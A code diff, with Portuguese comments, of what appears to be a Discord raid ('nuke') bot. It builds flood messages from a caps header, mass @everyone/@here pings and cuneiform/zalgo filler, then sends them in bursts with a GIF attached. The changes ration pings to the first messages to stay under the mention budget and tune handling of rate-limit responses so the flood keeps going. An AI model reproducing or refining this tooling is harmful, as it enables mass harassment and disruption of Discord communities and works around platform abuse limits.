@@ -131,22 +131,25 @@ def cunei_text(n_blocos: int = 12, min_rep: int = 8, max_rep: int = 22) -> str:
                     for _ in range(n_blocos))
 
 
-def build_nuke_payload() -> str:
+def build_nuke_payload(pings: bool = True) -> str:
     """~2000 chars estruturados:
        1) linha SOCIETY em caps/bold (bem visivel)
-       2) @everyone/@here em massa
+       2) @everyone/@here em massa (somente quando pings=True — mention budget é finito)
        3) cuneiforme+zalgo pra encher
-       (GIF vai como anexo da mensagem via _gif_file — URL morta removida)"""
+       (GIF vai como anexo da mensagem via _gif_file)"""
     # 1) texto visivel
     header = f"🔥 **{SOCIETY_LINE.upper()}** 🔥"
-    # 2) pings
-    pings = " ".join(random.choice(["@everyone", "@here", "@everyone @everyone",
-                                    "@here @here", "@everyone @here"])
-                     for _ in range(random.randint(4, 7)))
+    # 2) pings (opcional)
+    extra = ""
+    if pings:
+        extra = " " + " ".join(
+            random.choice(["@everyone", "@here", "@everyone @everyone",
+                           "@here @here", "@everyone @here"])
+            for _ in range(random.randint(4, 7)))
     # 3) filler cuneiforme/zalgo (o que sobra de espaco)
     filler = []
     cur = 0
-    budget = MAX_MSG - len(header) - len(pings)
+    budget = MAX_MSG - len(header) - len(extra)
     while cur < budget:
         r = random.random()
         if r < 0.55:
@@ -162,7 +165,7 @@ def build_nuke_payload() -> str:
             seg = seg[: budget - cur]
         filler.append(seg)
         cur += len(seg)
-    body = f"{header}\n{pings}\n{''.join(filler)}"
+    body = f"{header}{extra}\n{''.join(filler)}"
     return body[:MAX_MSG]
 
 
@@ -311,26 +314,29 @@ async def _check_ok(ctx) -> bool:
 
 # ============================ ENVIO / VIEW ============================
 async def _burst_send(channel, n: int, base: str | None,
+                      ping_first: int = 2,
                       max_wait: float = 20.0, max_fails: int = 5) -> int:
     """Envia n mensagens respeitando o rate limit real, SEM travar nunca.
-    - 429 com retry curto: espera e continua.
-    - 429 com retry LONGO (@everyone/ping exaurido): após 5 falhas ou 20s de
-      espera acumulada, ABORTA e retorna o que conseguiu (loop nunca fica infinito).
+    - Ping (@everyone) só nas primeiras `ping_first` mensagens: o mention budget
+      do app é finito (~centenas/10min) e exaurido vira 429 com retry gigante.
+    - 429 com retry curto: espera e continua; 429 longo: aborta após 5 falhas/20s.
+    - Loga o erro real no console do runner (flush) pra diagnóstico.
     Cada mensagem leva o GIF custom ANEXADO (discord.File)."""
     ok = 0
     fails = 0
     waited = 0.0
-    for _ in range(n):
+    for i in range(n):
         try:
             if base:
                 msg = f"{base}\n\n{SOCIETY_LINE}"
             else:
-                msg = build_nuke_payload()
+                msg = build_nuke_payload(pings=(i < ping_first))
             await channel.send(msg, allowed_mentions=MENTIONS, file=_gif_file())
             ok += 1
             fails = 0
             waited = 0.0
         except discord.HTTPException as e:
+            print(f"[burst] HTTP {e.status} retry_after={getattr(e, 'retry_after', None)}", flush=True)
             if e.status == 429:
                 ra = getattr(e, "retry_after", None) or 1.0
                 fails += 1
@@ -340,7 +346,8 @@ async def _burst_send(channel, n: int, base: str | None,
                 await asyncio.sleep(min(ra, 4.0))
             else:
                 break
-        except Exception:
+        except Exception as ex:
+            print(f"[burst] exceção: {ex!r}", flush=True)
             break
         await asyncio.sleep(0.02)
     return ok
